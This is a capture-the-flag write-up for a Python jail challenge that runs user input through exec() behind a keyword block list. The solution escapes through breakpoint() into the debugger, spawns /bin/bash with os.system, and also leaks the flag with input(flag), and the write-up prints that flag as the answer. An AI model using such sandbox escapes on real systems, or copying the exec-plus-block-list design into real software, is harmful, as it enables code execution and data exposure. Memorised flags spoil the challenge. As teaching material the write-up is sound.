# my-little-jail

## problem

They say its hard to make a jail but you can just block stuff right?

```py
flag = "ictf{REDACTED}"

def execute():
    try:
        command = input("> ")
        if command in ['exit', 'quit']:
            return False

        # Disallow certain keywords and built-in methods
        disallowed = ['.','help','print', '__', 'import', 'eval', 'exec', 'os', 'sys', 'open']
        if any(x in command for x in disallowed):
            print("Error: Command not allowed!")
            return True
        
        # Execute command
        result = exec(command)
        if result:
            print(result)
        return True
    except Exception as e:
        print(f"Error")
        return True

if __name__ == "__main__":
    print("Welcome to the Python Jail! You can execute any Python command.")
    print("The goal is to reveal the flag. Type 'exit' or 'quit' to leave.")
    while execute():
        pass
```

## solution

we see that some things are not allowed, but we know the flag is in the global scope.

we can use either the `breakpoint` function to get access to a python shell immediately

```
Welcome to the Python Jail! You can execute any Python command.
The goal is to reveal the flag. Type 'exit' or 'quit' to leave.
> breakpoint()

(Pdb) import os; os.system("/bin/bash")
$ ls
run
$ cat run
...
<file contents including flag>
...
```

or use the `input` function because it prints out it's first argument and flag is in scope

```
> input(flag)
ictf{0h_1_m1ss3d_s0m3th1ng_d1dnt_1}
```

